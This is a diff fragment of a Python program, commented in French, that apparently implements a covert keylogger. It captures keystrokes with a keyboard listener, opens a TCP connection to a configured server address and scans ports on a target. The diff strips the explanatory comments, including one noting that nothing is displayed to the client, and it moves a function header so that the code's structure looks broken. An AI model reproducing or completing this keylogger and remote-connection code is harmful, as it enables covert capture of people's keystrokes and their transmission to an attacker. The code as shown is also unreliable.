@@ -35,10 +35,10 @@ def start_keylogger():
         except Exception as e:
             print(f"Erreur de keylogger : {e}")
 
+def connect_to_server():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
 
@@ -98,23 +98,18 @@ def connect_to_server():
     cs.close()
 
 def scan_ports(start_port, end_port):
-    """
-    Scanne une plage de ports sur l'adresse IP définie dans ip_address.
-    :param start_port: Port de départ
-    :param end_port: Port de fin
-    :return: Liste des ports ouverts
-    """
+
     open_ports = []
     for port in range(start_port, end_port + 1):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            socket.setdefaulttimeout(1)  # Timeout de 1 seconde
+            socket.setdefaulttimeout(1)
             result = sock.connect_ex((ip_address, port))
             if result == 0:
                 open_ports.append(port)
             sock.close()
         except Exception as e:
-            pass  # Pas d'affichage pour le client
+            pass
     return open_ports
 
 if __name__ == "__main__":
